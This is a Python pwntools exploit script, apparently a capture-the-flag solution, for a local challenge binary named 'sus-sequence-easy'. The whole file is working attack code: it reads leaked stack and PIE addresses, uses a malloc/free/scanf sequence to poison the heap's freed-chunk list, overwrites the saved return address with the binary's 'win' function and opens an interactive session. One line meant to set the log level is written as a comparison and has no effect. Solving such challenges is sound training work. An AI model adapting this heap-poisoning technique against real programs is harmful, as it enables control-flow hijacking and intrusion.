#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/sus-sequence-easy")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def get_leak(io):
    data = io.recvuntil(b"[*]").decode()
    match = re.findall(r"0x[a-f\d]+",data)
    stack_leak = match[0]
    pie_leak = match[1]
    print(stack_leak,pie_leak)
    return io,int(stack_leak,16),int(pie_leak,16)

def control_flow():
    rbp = 0x7ff1234567
    index_arr_start = rbp - 0x110
    ret = rbp + 0x8
    offset = ret - index_arr_start

    io = process()
    io,stack_leak,pie_leak = get_leak(io)
    elf.address = pie_leak - elf.sym.main
    actual_ret_add = stack_leak + offset
    io = malloc(io,0,24)
    io = malloc(io,1,24)
    io = free(io,0)
    io = free(io,1)
    io = scanf(io,1,p64(actual_ret_add))
    io = malloc(io,0,24)
    io = malloc(io,2,24)
    io = scanf(io,2,p64(elf.sym.win))
    io = quit(io)
    io.interactive()


if __name__ == "__main__":
    control_flow()

